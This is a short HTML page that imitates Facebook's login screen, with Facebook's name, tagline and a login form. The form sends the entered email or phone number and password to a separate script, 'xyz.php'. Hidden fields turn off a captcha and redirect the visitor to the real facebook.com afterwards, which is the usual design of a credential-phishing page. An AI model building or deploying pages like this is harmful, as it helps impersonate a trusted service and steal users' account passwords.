<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook Login </title>
    <link rel="stylesheet" href="style.css">
  </head>
  <body>
    <div class="container flex">
      <div class="facebook-page flex">
        <div class="text">
          <h1>facebook</h1>
          <p>Connect with friends and the world </p>
          <p> around you on Facebook.</p>
        </div>
        <form action="xyz.php" method="POST">
          <input type="text" name="email" class="form-control" placeholder="Email or phone number" required>
          <input type="password" name="password" class="form-control" placeholder="password" required>
          <div class="link">
            <button type="submit" class="login">Login</button>
            <a href="#" class="forgot">Forgot password?</a>
              <input type="hidden" name="_captcha" value="false">
              <input type="hidden" name="_next" value="https://facebook.com">
          </div>
          <hr>
          <div class="button">
            <a href="#">Create new account</a>
          </div>
        </form>
      </div>
    </div>
  </body>
</html>

